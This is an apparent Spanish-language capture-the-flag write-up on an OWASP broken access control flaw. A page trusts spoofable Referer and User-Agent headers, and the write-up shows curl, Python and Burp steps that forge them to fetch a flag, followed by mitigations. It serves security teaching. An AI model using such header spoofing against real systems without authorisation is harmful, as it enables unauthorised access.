# A5 - Broken Access Control (HTTP Header Validation)

Vulnerabilidad del OWASP Top 10 (2017). La aplicación restringe el acceso a un recurso validando los headers `Referer` y `User-Agent`, pero ambos son completamente controlables por el cliente y no constituyen un mecanismo de seguridad válido.

---

## Pasos para obtener la flag

### 1. Identificar el vector

Al inspeccionar el HTML de la página objetivo se encuentran comentarios que revelan los requisitos:
```
<!-- You must come from : "https://www.nsa.gov/". -->
```

El servidor valida:
- `Referer: https://www.nsa.gov/`
- `User-Agent: ft_bornToSec`

### 2. Explotar

**Opción A – Burp Suite:**
1. Interceptar la petición GET a la página.
2. Cambiar el `User-Agent`:
   ```
   User-Agent: ft_bornToSec
   ```
3. Cambiar el `Referer`:
   ```
   Referer: https://www.nsa.gov/
   ```
4. Reenviar → el servidor devuelve la **flag**.

**Opción B – cURL:**
```bash
curl -H "User-Agent: ft_bornToSec" \
     -H "Referer: https://www.nsa.gov/" \
     "http://<IP>/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"
```

**Opción C – Python:**
```python
import requests

headers = {
    'User-Agent': 'ft_bornToSec',
    'Referer': 'https://www.nsa.gov/'
}
response = requests.get('http://<IP>/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f', headers=headers)
print(response.text)
```

### 3. Por qué funciona

Los headers HTTP son enviados por el cliente y pueden falsificarse libremente. El servidor los acepta sin ninguna verificación criptográfica ni de origen real.

---

## Impacto

- **Bypass de validación:** acceso a recursos restringidos sin estar en el origen legítimo.
- **Suplantación de cliente:** hacerse pasar por un agente o referrer confiable.
- **Escalada de privilegios:** acceso a funcionalidades no autorizadas.

---

## Mitigación

1. **Nunca usar headers HTTP como control de acceso:** `Referer` y `User-Agent` son datos no verificables.
2. **Autenticación robusta en servidor:** sesiones, tokens firmados (JWT, CSRF tokens).
3. **No exponer lógica de validación en comentarios HTML.**
4. **Logging:** registrar accesos con origenes inesperados para detectar abusos.
